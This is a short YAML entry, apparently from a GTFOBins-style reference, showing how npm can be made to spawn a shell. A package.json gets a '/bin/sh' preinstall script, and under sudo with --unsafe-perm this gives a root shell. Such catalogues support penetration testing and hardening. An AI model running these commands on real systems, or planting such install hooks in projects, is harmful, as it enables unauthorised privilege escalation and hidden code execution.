---
functions:
  shell:
    - code: |
        TF=$(mktemp -d)
        echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
        npm -C $TF i
  sudo:
    - code: |
        TF=$(mktemp -d)
        echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
        sudo npm -C $TF --unsafe-perm i
---
